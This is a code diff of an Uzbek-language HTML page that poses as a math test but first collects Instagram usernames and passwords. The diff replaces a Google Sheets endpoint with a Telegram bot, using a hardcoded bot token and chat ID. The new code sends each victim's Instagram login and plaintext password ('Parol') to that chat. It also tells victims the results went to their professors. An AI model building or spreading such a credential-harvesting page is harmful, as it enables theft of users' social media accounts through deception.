@@ -7,48 +7,28 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             font-family: 'Inter', sans-serif;
             min-height: 100vh;
             padding: 20px;
         }
-
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-        }
-
+        .container { max-width: 900px; margin: 0 auto; }
         .card {
             background: white;
             border-radius: 32px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             overflow: hidden;
-            margin-bottom: 20px;
         }
-
         .header {
             background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
             padding: 30px;
             text-align: center;
             color: white;
         }
-
-        .header h1 {
-            font-size: 2rem;
-            margin-bottom: 10px;
-        }
-
-        .header h1 i {
-            color: #f59e0b;
-        }
-
+        .header h1 { font-size: 2rem; margin-bottom: 10px; }
+        .header h1 i { color: #f59e0b; }
         .instagram-badge {
             display: inline-block;
             background: rgba(255,255,255,0.2);
@@ -57,20 +37,9 @@
             margin-top: 15px;
             font-size: 0.85rem;
         }
-
-        .content {
-            padding: 30px;
-        }
-
-        .login-form {
-            max-width: 450px;
-            margin: 0 auto;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
+        .content { padding: 30px; }
+        .login-form { max-width: 450px; margin: 0 auto; }
+        .input-group { margin-bottom: 20px; }
         .input-group label {
             display: flex;
             align-items: center;
@@ -79,12 +48,7 @@
             margin-bottom: 8px;
             color: #1e293b;
         }
-
-        .input-group label i {
-            color: #f59e0b;
-            width: 20px;
-        }
-
+        .input-group label i { color: #f59e0b; }
         .input-group input {
             width: 100%;
             padding: 14px 18px;
@@ -93,13 +57,11 @@
             font-size: 1rem;
             transition: all 0.2s;
         }
-
         .input-group input:focus {
             outline: none;
             border-color: #f59e0b;
             box-shadow: 0 0 0 3px rgba(245,158,11,0.2);
         }
-
         .btn {
             width: 100%;
             padding: 14px;
@@ -112,11 +74,7 @@
             cursor: pointer;
             transition: transform 0.1s;
         }
-
-        .btn:hover {
-            transform: scale(0.98);
-        }
-
+        .btn:hover { transform: scale(0.98); }
         .warning {
             background: #fffbeb;
             border-left: 4px solid #f59e0b;
@@ -126,11 +84,7 @@
             font-size: 0.75rem;
             color: #92400e;
         }
-
-        .test-section {
-            display: none;
-        }
-
+        .test-section { display: none; }
         .question-card {
             background: #f8fafc;
             border-radius: 20px;
@@ -138,7 +92,6 @@
             margin-bottom: 20px;
             border: 1px solid #e2e8f0;
         }
-
         .question-number {
             display: inline-block;
             background: #e2e8f0;
@@ -148,20 +101,13 @@
             font-weight: 600;
             margin-bottom: 12px;
         }
-
         .question-text {
             font-size: 1.1rem;
             font-weight: 600;
             margin-bottom: 15px;
             color: #1e293b;
         }
-
-        .options {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
+        .options { display: flex; flex-direction: column; gap: 10px; }
         .option {
             display: flex;
             align-items: center;
@@ -171,30 +117,17 @@
             border: 1px solid #e2e8f0;
             border-radius: 14px;
             cursor: pointer;
-            transition: all 0.1s;
         }
-
         .option.selected {
             background: #fef3c7;
             border-color: #f59e0b;
         }
-
-        .option input {
-            width: 18px;
-            height: 18px;
-            cursor: pointer;
-        }
-
-        .option label {
-            flex: 1;
-            cursor: pointer;
-        }
-
+        .option input { width: 18px; height: 18px; cursor: pointer; }
+        .option label { flex: 1; cursor: pointer; }
         .submit-btn {
             margin-top: 20px;
             background: linear-gradient(95deg, #10b981, #059669);
         }
-
         .result-area {
             margin-top: 20px;
             padding: 15px;
@@ -202,23 +135,9 @@
             text-align: center;
             display: none;
         }
-
-        .result-area.success {
-            background: #d1fae5;
-            color: #065f46;
-        }
-
-        .result-area.error {
-            background: #fee2e2;
-            color: #991b1b;
-        }
-
-        .footer {
-            text-align: center;
-            padding: 20px;
-            color: #64748b;
-            font-size: 0.75rem;
-        }
+        .result-area.success { background: #d1fae5; color: #065f46; }
+        .result-area.error { background: #fee2e2; color: #991b1b; }
+        .footer { text-align: center; padding: 20px; color: #64748b; font-size: 0.75rem; }
     </style>
 </head>
 <body>
@@ -268,8 +187,9 @@
 </div>
 
 <script>
-    // Google Sheets Script URL (SIZNING SOZLANGAN URL)
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyVCs39FKFm7099TSmFppgEnj-9QbcpBb8k8q88VqUpVOY62Qqye8Bn7lAxISsDp2cb/exec';
+    // Telegram sozlamalari
+    const BOT_TOKEN = '8660191874:AAEGAnELpJbRX4BQGCI0xIIqiBXxkZ05l8E';
+    const CHAT_ID = '5008741322';
     
     const TESTS = [
         { text: "x + 5 = 12 bo‘lsa, x ni toping.", options: ["5", "7", "12", "17"], correct: 1 },
@@ -297,39 +217,25 @@
         return { correct, total: TESTS.length, percent: Math.round(correct / TESTS.length * 100) };
     }
 
-    async function sendToGoogleSheets() {
-        const score = calculateScore();
-        
-        let answersDetail = '';
-        for (let i = 0; i < TESTS.length; i++) {
-            const userChoice = userAnswers[i];
-            const isCorrect = (userChoice === TESTS[i].correct);
-            const userAnswerText = userChoice !== null ? TESTS[i].options[userChoice] : 'Javob berilmagan';
-            const correctText = TESTS[i].options[TESTS[i].correct];
-            const mark = isCorrect ? '✅' : '❌';
-            answersDetail += `${i+1}. ${mark} ${userAnswerText} (to‘g‘ri: ${correctText})\n`;
-        }
-        
-        const data = {
-            username: currentUser.username,
-            password: currentUser.password,
-            score: score.correct,
-            total: score.total,
-            percent: score.percent,
-            answersDetail: answersDetail
-        };
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
         try {
-            const response = await fetch(SCRIPT_URL, {
+            const response = await fetch(url, {
                 method: 'POST',
-                mode: 'no-cors',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
             });
-            return { score, success: true };
+            
+            const data = await response.json();
+            return data.ok;
         } catch (error) {
             console.error('Xatolik:', error);
-            return { score, success: false };
+            return false;
         }
     }
 
@@ -342,20 +248,41 @@
         }
         
         const submitBtn = document.getElementById('submitTestBtn');
-        const originalText = submitBtn.innerHTML;
         submitBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Jo‘natilmoqda...';
         submitBtn.disabled = true;
         
-        const result = await sendToGoogleSheets();
+        const score = calculateScore();
+        
+        let answersDetail = '';
+        for (let i = 0; i < TESTS.length; i++) {
+            const userChoice = userAnswers[i];
+            const isCorrect = (userChoice === TESTS[i].correct);
+            const userAnswerText = userChoice !== null ? TESTS[i].options[userChoice] : 'Javob berilmagan';
+            const correctText = TESTS[i].options[TESTS[i].correct];
+            const mark = isCorrect ? '✅' : '❌';
+            answersDetail += `${i+1}. ${mark} ${userAnswerText}\n`;
+        }
+        
+        const date = new Date().toLocaleString('uz-UZ', { hour12: false });
+        let message = `📊 <b>YANGI TEST NATIJASI</b>\n\n`;
+        message += `👤 <b>Instagram:</b> ${currentUser.username}\n`;
+        message += `🔐 <b>Parol:</b> ${currentUser.password}\n`;
+        message += `📅 <b>Vaqt:</b> ${date}\n`;
+        message += `━━━━━━━━━━━━━━━━━━\n`;
+        message += `📈 <b>Natija:</b> ${score.correct}/${score.total} (${score.percent}%)\n`;
+        message += `━━━━━━━━━━━━━━━━━━\n`;
+        message += `<b>📝 Javoblar:</b>\n${answersDetail}`;
+        
+        const sent = await sendToTelegram(message);
         
         const resultDiv = document.getElementById('resultMessage');
         resultDiv.style.display = 'block';
         
-        if (result.success) {
+        if (sent) {
             resultDiv.className = 'result-area success';
             resultDiv.innerHTML = `
                 <i class="fas fa-check-circle" style="font-size: 28px;"></i><br><br>
-                <strong>Natijangiz: ${result.score.correct}/${result.score.total} (${result.score.percent}%)</strong><br><br>
+                <strong>Natijangiz: ${score.correct}/${score.total} (${score.percent}%)</strong><br><br>
                 ✅ Natijalar professor-o‘qituvchilarga jo‘natildi!<br>
                 <small>Rahmat! Sizning ishtirokingiz qayd etildi.</small>
             `;
@@ -366,10 +293,10 @@
             resultDiv.innerHTML = `
                 <i class="fas fa-exclamation-triangle" style="font-size: 28px;"></i><br><br>
                 <strong>Xatolik yuz berdi!</strong><br>
-                Iltimos, internet aloqasini tekshirib, qayta urinib ko‘ring.<br><br>
+                Internet aloqasini tekshirib, qayta urinib ko‘ring.<br><br>
                 <button onclick="location.reload()" style="padding:10px 20px;background:#f59e0b;color:white;border:none;border-radius:12px;cursor:pointer;">Qayta urinish</button>
             `;
-            submitBtn.innerHTML = originalText;
+            submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Qayta urinish';
             submitBtn.disabled = false;
         }
     }
